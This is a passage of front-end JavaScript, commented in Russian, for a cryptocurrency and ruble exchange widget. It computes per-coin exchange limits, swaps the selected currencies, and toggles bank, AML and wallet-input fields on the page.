                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(6);

                    document.querySelector('.first__input-two').placeholder = `${minLimitValuteSecond} - ${(maxLimitValuteSecond)} ETC`;
                } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_XLM;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_XLM;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${addedEmptyInNumbers(minLimitValuteSecond)} - ${addedEmptyInNumbers(maxLimitValuteSecond)} XLM`;
                } else if ( valuteSecondName == 'Tron (TRX)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_TRX;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_TRX;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${addedEmptyInNumbers(minLimitValuteSecond)} - ${addedEmptyInNumbers(maxLimitValuteSecond)} TRX`;
                } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_TON;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_TON;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${addedEmptyInNumbers(minLimitValuteSecond)} - ${addedEmptyInNumbers(maxLimitValuteSecond)} TON`;
                } else if ( valuteSecondName == 'Dash (DASH)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_DASH;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_DASH;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${addedEmptyInNumbers(minLimitValuteSecond)} - ${addedEmptyInNumbers(maxLimitValuteSecond)} DASH`;
                } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_ZEC;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_ZEC;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${addedEmptyInNumbers(minLimitValuteSecond)} - ${addedEmptyInNumbers(maxLimitValuteSecond)} ZEC`;
                } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_BNB;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_BNB;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${addedEmptyInNumbers(minLimitValuteSecond)} - ${addedEmptyInNumbers(maxLimitValuteSecond)} BNB`;
                } else if ( valuteSecondName == 'Monero (XMR)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_XMR;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_XMR;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${addedEmptyInNumbers(minLimitValuteSecond)} - ${addedEmptyInNumbers(maxLimitValuteSecond)} XMR`;
                } else if ( valuteSecondName == 'Tether BEP20 (USDT)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_USDT;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_USDT;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${addedEmptyInNumbers(minLimitValuteSecond)} - ${addedEmptyInNumbers(maxLimitValuteSecond)} USDT`;
                } else if ( valuteSecondName == 'Tether TON (USDT)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_USDT;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_USDT;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${addedEmptyInNumbers(minLimitValuteSecond)} - ${addedEmptyInNumbers(maxLimitValuteSecond)} USDT`;
                } else if ( valuteSecondName == 'Tether SOL (USDT)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_USDT;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_USDT;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${addedEmptyInNumbers(minLimitValuteSecond)} - ${addedEmptyInNumbers(maxLimitValuteSecond)} USDT`;
                } else if ( valuteSecondName == 'USD Coin SOL (USDC)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_USDC;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_USDC;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${addedEmptyInNumbers(minLimitValuteSecond)} - ${addedEmptyInNumbers(maxLimitValuteSecond)} USDC`;
                }  else if ( valuteSecondName == 'Monero (XMR)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_XMR;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_XMR;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${addedEmptyInNumbers(minLimitValuteSecond)} - ${addedEmptyInNumbers(maxLimitValuteSecond)} XMR`;
                } else if ( valuteSecondName == 'Dash (DASH)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_DASH;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_DASH;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${addedEmptyInNumbers(minLimitValuteSecond)} - ${addedEmptyInNumbers(maxLimitValuteSecond)} DASH`;
                } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_ZEC;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_ZEC;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${addedEmptyInNumbers(minLimitValuteSecond)} - ${addedEmptyInNumbers(maxLimitValuteSecond)} ZEC`;
                } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_BNB;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_BNB;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${addedEmptyInNumbers(minLimitValuteSecond)} - ${addedEmptyInNumbers(maxLimitValuteSecond)} BNB`;
                }
            
            }
            getCurrencies();
            
        }).catch((error) => {
            console.error('Ошибка получения списка: ', error);
        })

    }

}

// Добавление пробелов в большие числа

function addedEmptyInNumbers(num) {

    if ( num > 999 && num < 9999 ) {
        num = `${String(num)[0]} ${String(num)[1]}${String(num)[2]}${String(num)[3]}${String(num)[4]}${String(num)[5]}${String(num)[6]}`;
    } else if ( num > 9999 && num < 99999 ) {
        num = `${String(num)[0]}${String(num)[1]} ${String(num)[2]}${String(num)[3]}${String(num)[4]}${String(num)[5]}${String(num)[6]}${String(num)[7]}`;
    } else if ( num > 99999 && num < 999999 ) {
        num = `${String(num)[0]}${String(num)[1]}${String(num)[2]} ${String(num)[3]}${String(num)[4]}${String(num)[5]}${String(num)[6]}${String(num)[7]}${String(num)[8]}`;
    } else if ( num > 999999 && num < 9999999 ) {
        num = `${String(num)[0]} ${String(num)[1]}${String(num)[2]}${String(num)[3]} ${String(num)[4]}${String(num)[5]}${String(num)[6]}${String(num)[7]}${String(num)[8]}${String(num)[9]}`;
    }

    return num

}

// Swap валют местамм

document.querySelector('.first__rght svg').addEventListener('click', event => {

    document.querySelectorAll('.first__message')[0].style.display = 'none';
    document.querySelectorAll('.first__table')[0].style.border = '2px solid #cfcfcf';
    document.querySelectorAll('.first__table')[0].style.marginBottom = '0px';
    document.querySelectorAll('.first__message')[1].style.display = 'none';
    document.querySelectorAll('.first__table')[1].style.border = '2px solid #cfcfcf';
    document.querySelectorAll('.first__table')[1].style.marginBottom = '0px';

    document.querySelector('.first__input-one').value = '';
    document.querySelector('.first__input-two').value = '';

    let boofer1 = '';
    let boofer2 = '';
    let boofer3 = '';
    let boofer4 = '';

    boofer1 = valuteFirstName;
    boofer2 = valuteFirstCode;
    boofer3 = valuteCategoryFirst;
    boofer4 = categoryButtonsFirst;

    valuteFirstName = valuteSecondName;
    valuteFirstCode = valuteSecondCode;
    valuteCategoryFirst = valuteCategorySecond;
    categoryButtonsFirst = categoryButtonsSecond;

    valuteSecondName = boofer1;
    valuteSecondCode = boofer2;
    valuteCategorySecond = boofer3;
    categoryButtonsSecond = boofer4;

    editTitle();
    reChoosingSecondValute();
    rewriteLimitsNumbers();
    limitsInValute();
    hiddingSecondValutes();

    document.querySelector('.first__get p').textContent = `Отдаете ${valuteFirstName}`;
    document.querySelector('.first__lft p').textContent = `Получаете ${valuteSecondName}`;

    boofer1 = '';
    boofer2 = '';
    boofer3 = '';
    boofer4 = '';

    boofer1 = document.querySelectorAll('.first__valute img')[0].src;
    boofer2 = document.querySelectorAll('.first__valute img')[1].src;

    document.querySelectorAll('.first__valute img')[0].src = boofer2;
    document.querySelectorAll('.first__valute img')[1].src = boofer1;

    document.querySelectorAll('.table__valute').forEach( (item, i) => {
        item.classList.remove('table__valute-active');
    })

    document.querySelectorAll('.table__valute').forEach( (item, i) => {
        if ( document.querySelectorAll('.table__valute p')[i].textContent == valuteFirstName ) {
            document.querySelectorAll('.table__valute')[i].classList.add('table__valute-active')
        }
    })

    document.querySelectorAll('.table-two__valute').forEach( (item, i) => {
        item.classList.remove('table-two__valute-active');
    })

    document.querySelectorAll('.table-two__valute').forEach( (item, i) => {
        if ( document.querySelectorAll('.table-two__valute p')[i].textContent == valuteSecondName ) {
            document.querySelectorAll('.table-two__valute')[i].classList.add('table-two__valute-active')
            document.querySelector('.first__lft span').textContent = document.querySelectorAll('.table-two__reserv')[i].textContent;
        }
    })

    boofer1 = '';
    boofer2 = '';
    boofer3 = '';
    boofer4 = '';

    boofer1 = minLimitFirst;
    boofer2 = maxLimitFirst;

    minLimitFirst = minLimitSecond; 
    maxLimitFirst = maxLimitSecond;

    minLimitSecond = boofer1;
    maxLimitSecond = boofer2;

    boofer3 = minLimitValuteFirst;
    boofer4 = maxLimitValuteFirst;

    minLimitValuteFirst = minLimitValuteSecond;
    maxLimitValuteFirst = maxLimitValuteSecond;

    minLimitValuteSecond = boofer3;
    maxLimitValuteSecond = boofer4;

    document.querySelectorAll('.table__button').forEach( (item, i) => {
        item.classList.remove('table__button-active');
    })
    document.querySelectorAll('.table__button')[0].classList.add('table__button-active');

    document.querySelectorAll('.table-two__button').forEach( (item, i) => {
        item.classList.remove('table-two__button-active');
    })
    document.querySelectorAll('.table-two__button')[0].classList.add('table-two__button-active');

    document.querySelectorAll('.table__valute').forEach( (item, i) => {
        item.style.display = 'flex';
    })

    writingTitleBottomArea();

})

function swapValute() {
    document.querySelector('.first__input-one').value = '';
    document.querySelector('.first__input-two').value = '';

    let boofer1 = '';
    let boofer2 = '';
    let boofer3 = '';
    let boofer4 = '';

    boofer1 = valuteFirstName;
    boofer2 = valuteFirstCode;
    boofer3 = valuteCategoryFirst;
    boofer4 = categoryButtonsFirst;

    valuteFirstName = valuteSecondName;
    valuteFirstCode = valuteSecondCode;
    valuteCategoryFirst = valuteCategorySecond;
    categoryButtonsFirst = categoryButtonsSecond;

    valuteSecondName = boofer1;
    valuteSecondCode = boofer2;
    valuteCategorySecond = boofer3;
    categoryButtonsSecond = boofer4;

    editTitle();
    reChoosingSecondValute();
    rewriteLimitsNumbers();
    limitsInValute();
    hiddingSecondValutes();

    document.querySelector('.first__get p').textContent = `Отдаете ${valuteFirstName}`;
    document.querySelector('.first__lft p').textContent = `Получаете ${valuteSecondName}`;

    boofer1 = '';
    boofer2 = '';
    boofer3 = '';
    boofer4 = '';

    boofer1 = document.querySelectorAll('.first__valute img')[0].src;
    boofer2 = document.querySelectorAll('.first__valute img')[1].src;

    document.querySelectorAll('.first__valute img')[0].src = boofer2;
    document.querySelectorAll('.first__valute img')[1].src = boofer1;

    document.querySelectorAll('.table__valute').forEach( (item, i) => {
        item.classList.remove('table__valute-active');
    })

    document.querySelectorAll('.table__valute').forEach( (item, i) => {
        if ( document.querySelectorAll('.table__valute p')[i].textContent == valuteFirstName ) {
            document.querySelectorAll('.table__valute')[i].classList.add('table__valute-active')
        }
    })

    document.querySelectorAll('.table-two__valute').forEach( (item, i) => {
        item.classList.remove('table-two__valute-active');
    })

    document.querySelectorAll('.table-two__valute').forEach( (item, i) => {
        if ( document.querySelectorAll('.table-two__valute p')[i].textContent == valuteSecondName ) {
            document.querySelectorAll('.table-two__valute')[i].classList.add('table-two__valute-active')
            document.querySelector('.first__lft span').textContent = document.querySelectorAll('.table-two__reserv')[i].textContent;
        }
    })

    boofer1 = '';
    boofer2 = '';
    boofer3 = '';
    boofer4 = '';

    boofer1 = minLimitFirst;
    boofer2 = maxLimitFirst;

    minLimitFirst = minLimitSecond; 
    maxLimitFirst = maxLimitSecond;

    minLimitSecond = boofer1;
    maxLimitSecond = boofer2;

    boofer3 = minLimitValuteFirst;
    boofer4 = maxLimitValuteFirst;

    minLimitValuteFirst = minLimitValuteSecond;
    maxLimitValuteFirst = maxLimitValuteSecond;

    minLimitValuteSecond = boofer3;
    maxLimitValuteSecond = boofer4;

    document.querySelectorAll('.table__button').forEach( (item, i) => {
        item.classList.remove('table__button-active');
    })
    document.querySelectorAll('.table__button')[0].classList.add('table__button-active');

    document.querySelectorAll('.table-two__button').forEach( (item, i) => {
        item.classList.remove('table-two__button-active');
    })
    document.querySelectorAll('.table-two__button')[0].classList.add('table-two__button-active');

    document.querySelectorAll('.table__valute').forEach( (item, i) => {
        item.style.display = 'flex';
    })

    writingTitleBottomArea();
}
swapValute();
swapValute();

// Открытие списка банков

let activeBankList = false;
document.querySelector('.first__banklist').addEventListener('click', event => {
    document.querySelectorAll('.first__message')[2].style.display = 'none';
    document.querySelectorAll('.first__banklist')[0].style.border = '2px solid #CFCFCF';
    document.querySelectorAll('.first__banklist')[0].style.marginBottom = '0px';

    if ( activeBankList == false ) {
        document.querySelector('.table-three').style.display = 'block';
        activeBankList = true;
    } else {
        document.querySelector('.table-three').style.display = 'none';
        activeBankList = false;
    }

    document.querySelector('.first__info-window-one').style.display = 'none';
    document.querySelector('.first__info-window-two').style.display = 'none';
    document.querySelector('.first__info-window-three').style.display = 'none';
    document.querySelector('.table').style.display = 'none';
    document.querySelector('.table-two').style.display = 'none';
})

// Выбор банка

document.querySelectorAll('.table-three__valute').forEach( (item, i) => {
    item.addEventListener('click', event => {
        needBANK = false;

        document.querySelectorAll('.table-three__valute').forEach( (item, i) => {
            item.classList.remove('table-three__valute-active');
        })

        item.classList.add('table-three__valute-active');

        document.querySelector('.first__icn').scr = document.querySelectorAll('.table-three__valute img')[5].scr;

        document.querySelector('.first__bankname').textContent = document.querySelectorAll('.table-three__valute p')[i].textContent;
        document.querySelector('.first__icn').style.display = 'block';
        document.querySelector('.first__bankname').style.display = 'block';
        document.querySelector('.first__float').style.display = 'none';

        document.querySelectorAll('.first__icn')[0].src = document.querySelectorAll('.table-three__valute img')[i].src;
    })
})

// Вывод на экран списка банков при получении СБП

function openingBankSection() {

    needBANK = false;

    if ( valuteSecondName == 'СБП RUB' ) {
        document.querySelector('.first__bank').style.display = 'block';
        document.querySelector('.first__middle').style.display = 'none';
        document.querySelector('.first__get').style.marginBottom = '20px';
        needBANK = true;
    } else {
        document.querySelector('.first__bank').style.display = 'none';
        document.querySelector('.first__middle').style.display = 'block';
        document.querySelector('.first__get').style.marginBottom = '0px';
    }

    openingMoreAreas();

}

// Вывод на экран дополнительный полей и предупреждений в зависимости от валют



function openingMoreAreas() {

    document.querySelector('.rec__top-warning').style.display = 'none';
    document.querySelector('.rec__window1').style.display = 'none';
    document.querySelector('.rec__window0').style.display = 'none';
    document.querySelector('.rec__window2').style.display = 'none';
    document.querySelector('.rec__down-warning').style.display = 'none';
    document.querySelector('.rec__aml').style.display = 'none';

    needAML = false;
    needMEMO = false;
    // needBANK = false;

    document.querySelector('.rec__window1').style.display = 'block';
    document.querySelector('.rec__window2').style.display = 'block';

    if ( valuteCategoryFirst == 'SBP' && valuteCategorySecond == 'CRYPTO' ) {
        
        if ( valuteSecondName == 'Bitcoin (BTC)' ) {
            document.querySelector('.rec__aml').style.display = 'flex';
            needAML = true;
        }
    } else if ( valuteCategoryFirst == 'SBP' && valuteCategorySecond == 'PAYSYSTEM' ) {
        
    } else if ( valuteCategoryFirst == 'CRYPTO' && valuteCategorySecond == 'SBP' ) {
        

        if ( valuteFirstName == 'Bitcoin (BTC)' ) {
            document.querySelector('.rec__top-warning').style.display = 'block';
            document.querySelector('.rec__aml').style.display = 'flex';
            needAML = true;
        } else if ( valuteFirstName == 'Ethereum (ETH)' ) {
            document.querySelector('.rec__top-warning').style.display = 'block';
            document.querySelector('.rec__aml').style.display = 'flex';
            needAML = true;
        } else if ( valuteFirstName == 'Ethereum Optimism (ETH)' ) {
            document.querySelector('.rec__top-warning').style.display = 'block';
            document.querySelector('.rec__down-warning').style.display = 'block';
            document.querySelector('.rec__aml').style.display = 'flex';
            needAML = true;
        }
    } else if ( valuteCategoryFirst == 'BANK' && valuteCategorySecond == 'CRYPTO' ) {
        if ( valuteSecondName == 'Bitcoin (BTC)' ) {
            document.querySelector('.rec__aml').style.display = 'flex';
            needAML = true;
        }
    } else if ( valuteCategoryFirst == 'CRYPTO' && valuteCategorySecond == 'CRYPTO' ) {
        if ( valuteFirstName == 'Bitcoin (BTC)' ) {
            document.querySelector('.rec__top-warning').style.display = 'block';
            document.querySelector('.rec__down-warning').style.display = 'block';
            document.querySelector('.rec__aml').style.display = 'flex';
            needAML = true;
        } else {
            document.querySelector('.rec__down-warning').style.display = 'block';
        }
    } else if ( valuteCategoryFirst == 'CRYPTO' && valuteCategorySecond == 'BANK' ) {
        if ( valuteFirstName == 'Bitcoin (BTC)' ) {
            document.querySelector('.rec__top-warning').style.display = 'block';
            document.querySelector('.rec__aml').style.display = 'flex';
            needAML = true;
        }
    } 

    if ( valuteSecondName == 'Ripple (XRP)' || valuteSecondName == 'Stellar (XLM)' ) {
        document.querySelector('.rec__window0').style.display = 'block';
        needMEMO = true;
    }

}

// Активация и блюр полей ввода

document.querySelector('.first__input-one').addEventListener('focus', event => {
    document.querySelectorAll('.first__table')[0].style.border = '2px solid #000';
    document.querySelector('.rec').classList.add('rec-active');
    document.querySelector('.first__bottom').classList.add('first__bottom-active');
    openingMoreAreas();
})

document.querySelector('.first__input-one').addEventListener('blur', event => {
    document.querySelectorAll('.first__table')[0].style.border = '2px solid #cfcfcf';
})

document.querySelector('.first__input-two').addEventListener('focus', event => {
    document.querySelectorAll('.first__table')[1].style.border = '2px solid #000';
    document.querySelector('.rec').classList.add('rec-active');
    document.querySelector('.first__bottom').classList.add('first__bottom-active');
    openingMoreAreas();
})

document.querySelector('.first__input-two').addEventListener('blur', event => {
    document.querySelectorAll('.first__table')[1].style.border = '2px solid #cfcfcf';
})

document.querySelector('.rec__wallet input').addEventListener('focus', event => {
    document.querySelector('.rec__wallet').style.border = '2px solid #000';
})

document.querySelector('.rec__tage input').addEventListener('focus', event => {
    document.querySelector('.rec__tage').style.border = '2px solid #000';
})

document.querySelector('.rec__mail input').addEventListener('focus', event => {
    document.querySelector('.rec__mail').style.border = '2px solid #000';
})

document.querySelector('.rec__wallet input').addEventListener('blur', event => {
    document.querySelector('.rec__wallet').style.border = '2px solid #cfcfcf';
})

document.querySelector('.rec__tage input').addEventListener('blur', event => {
    document.querySelector('.rec__tage').style.border = '2px solid #cfcfcf';
})

document.querySelector('.rec__mail input').addEventListener('blur', event => {
    document.querySelector('.rec__mail').style.border = '2px solid #cfcfcf';
})

// Вывод текста з запросом кошелька/карты/телефона/Perfect Money

document.querySelectorAll('.table-two__valute').forEach( (item, i) => {
    item.addEventListener('click', event => {

        document.querySelector('.rec__wallet input').value = '';

        if ( item.classList.value.includes('table-two__valute-sbp') ) {
            document.querySelector('.rec__title-namewallet').textContent = 'Номер телефона';
            document.querySelector('.rec__subtitle').textContent = 'Укажите номер телефона куда вам перевести ваши средства';
            document.querySelector('.rec__wallet input').value = '+7';
        } else if ( item.classList.value.includes('table-two__valute-crypto') ) {
            document.querySelector('.rec__title-namewallet').textContent = `Кошелек ${document.querySelectorAll('.table-two__valute p')[i].textContent}`;
            document.querySelector('.rec__subtitle').textContent = 'Укажите реквизиты куда вам перевести ваши средства';
        } else if ( item.classList.value.includes('table-two__valute-paysystem') ) {
            document.querySelector('.rec__title-namewallet').textContent = `Кошелек PM USD`;
            document.querySelector('.rec__subtitle').textContent = 'Укажите реквизиты куда вам перевести ваши средства';
            document.querySelector('.rec__wallet input').value = 'U';
        } else if ( item.classList.value.includes('table-two__valute-bank') ) {
            document.querySelector('.rec__subtitle').textContent = 'Укажите номер карты куда вам перевести ваши средства';

            if ( document.querySelectorAll('.table-two__valute p')[i].textContent == 'Сбербанк RUB' ) {
                document.querySelector('.rec__title-namewallet').textContent = `Карта Сбербанк`;
            } else if ( document.querySelectorAll('.table-two__valute p')[i].textContent == 'Т-Банк' ) {
                document.querySelector('.rec__title-namewallet').textContent = `Карта Т-Банка`;
            } else if ( document.querySelectorAll('.table-two__valute p')[i].textContent == 'Visa/MasterCard/Mir RUB' ) {
                document.querySelector('.rec__title-namewallet').textContent = `Карта RUB`;
            } else if ( document.querySelectorAll('.table-two__valute p')[i].textContent == 'Альфа-Банк RUB' ) {
                document.querySelector('.rec__title-namewallet').textContent = `Карта Альфа-Банк`;
            } else if ( document.querySelectorAll('.table-two__valute p')[i].textContent == 'Россельхозбанк' ) {
                document.querySelector('.rec__title-namewallet').textContent = `Карта Россельхозбанка`;
            } else if ( document.querySelectorAll('.table-two__valute p')[i].textContent == 'Росбанк' ) {
                document.querySelector('.rec__title-namewallet').textContent = `Карта Росбанка`;
            } else if ( document.querySelectorAll('.table-two__valute p')[i].textContent == 'Почта банк' ) {
                document.querySelector('.rec__title-namewallet').textContent = `Карта Почта банка`;
            } else if ( document.querySelectorAll('.table-two__valute p')[i].textContent == 'Открытие' ) {
                document.querySelector('.rec__title-namewallet').textContent = `Карта Открытие`;
            } else if ( document.querySelectorAll('.table-two__valute p')[i].textContent == 'Промсвязьбанк' ) {
                document.querySelector('.rec__title-namewallet').textContent = `Карта Промсвязьбанк`;
            } else if ( document.querySelectorAll('.table-two__valute p')[i].textContent == 'Русский Стандарт' ) {
                document.querySelector('.rec__title-namewallet').textContent = `Карта Русский Стандарт`;
            } else if ( document.querySelectorAll('.table-two__valute p')[i].textContent == 'Газпромбанк' ) {
                document.querySelector('.rec__title-namewallet').textContent = `Карта Газпромбанк`;
            } else if ( document.querySelectorAll('.table-two__valute p')[i].textContent == 'Авангард' ) {
                document.querySelector('.rec__title-namewallet').textContent = `Карта Авангард`;
            } else if ( document.querySelectorAll('.table-two__valute p')[i].textContent == 'Райфайзен RUB' ) {
                document.querySelector('.rec__title-namewallet').textContent = `Карта Райфайзен`;
            } else if ( document.querySelectorAll('.table-two__valute p')[i].textContent == 'РНКБ' ) {
                document.querySelector('.rec__title-namewallet').textContent = `Карта РНКБ`;
            } 

        }

    })
})

function writingTitleBottomArea() {

    document.querySelector('.rec__wallet input').value = '';

    if ( document.querySelector('.table-two__valute-active').classList.value.includes('table-two__valute-sbp') ) {
        document.querySelector('.rec__title-namewallet').textContent = 'Номер телефона';
        document.querySelector('.rec__subtitle').textContent = 'Укажите номер телефона куда вам перевести ваши средства';
        document.querySelector('.rec__wallet input').value = '+7';
    } else if ( document.querySelector('.table-two__valute-active').classList.value.includes('table-two__valute-crypto') ) {
        document.querySelector('.rec__title-namewallet').textContent = `Кошелек ${document.querySelector('.table-two__valute-active p').textContent}`;
        document.querySelector('.rec__subtitle').textContent = 'Укажите реквизиты куда вам перевести ваши средства';
    } else if ( document.querySelector('.table-two__valute-active').classList.value.includes('table-two__valute-paysystem') ) {
        document.querySelector('.rec__title-namewallet').textContent = `Кошелек PM USD`;
        document.querySelector('.rec__subtitle').textContent = 'Укажите реквизиты куда вам перевести ваши средства';
        document.querySelector('.rec__wallet input').value = 'U';
    } else if ( document.querySelector('.table-two__valute-active').classList.value.includes('table-two__valute-bank') ) {
        document.querySelector('.rec__subtitle').textContent = 'Укажите номер карты куда вам перевести ваши средства';

        if ( document.querySelector('.table-two__valute-active p').textContent == 'Сбербанк RUB' ) {
            document.querySelector('.rec__title-namewallet').textContent = `Карта Сбербанк`;
        } else if ( document.querySelector('.table-two__valute-active p').textContent == 'Т-Банк' ) {
            document.querySelector('.rec__title-namewallet').textContent = `Карта Т-Банка`;
        } else if ( document.querySelector('.table-two__valute-active p').textContent == 'Visa/MasterCard/Mir RUB' ) {
            document.querySelector('.rec__title-namewallet').textContent = `Карта RUB`;
        } else if ( document.querySelector('.table-two__valute-active p').textContent == 'Альфа-Банк RUB' ) {
            document.querySelector('.rec__title-namewallet').textContent = `Карта Альфа-Банк`;
        } else if ( document.querySelector('.table-two__valute-active p').textContent == 'Россельхозбанк' ) {
            document.querySelector('.rec__title-namewallet').textContent = `Карта Россельхозбанка`;
        } else if ( document.querySelector('.table-two__valute-active p').textContent == 'Росбанк' ) {
            document.querySelector('.rec__title-namewallet').textContent = `Карта Росбанка`;
        } else if ( document.querySelector('.table-two__valute-active p').textContent == 'Почта банк' ) {
            document.querySelector('.rec__title-namewallet').textContent = `Карта Почта банка`;
        } else if ( document.querySelector('.table-two__valute-active p').textContent == 'Открытие' ) {
            document.querySelector('.rec__title-namewallet').textContent = `Карта Открытие`;
        } else if ( document.querySelector('.table-two__valute-active p').textContent == 'Промсвязьбанк' ) {
            document.querySelector('.rec__title-namewallet').textContent = `Карта Промсвязьбанк`;
        } else if ( document.querySelector('.table-two__valute-active p').textContent == 'Русский Стандарт' ) {
            document.querySelector('.rec__title-namewallet').textContent = `Карта Русский Стандарт`;
        } else if ( document.querySelector('.table-two__valute-active p').textContent == 'Газпромбанк' ) {
            document.querySelector('.rec__title-namewallet').textContent = `Карта Газпромбанк`;
        } else if ( document.querySelector('.table-two__valute-active p').textContent == 'Авангард' ) {
            document.querySelector('.rec__title-namewallet').textContent = `Карта Авангард`;
        } else if ( document.querySelector('.table-two__valute-active p').textContent == 'Райфайзен RUB' ) {
            document.querySelector('.rec__title-namewallet').textContent = `Карта Райфайзен`;
        } else if ( document.querySelector('.table-two__valute-active p').textContent == 'РНКБ' ) {
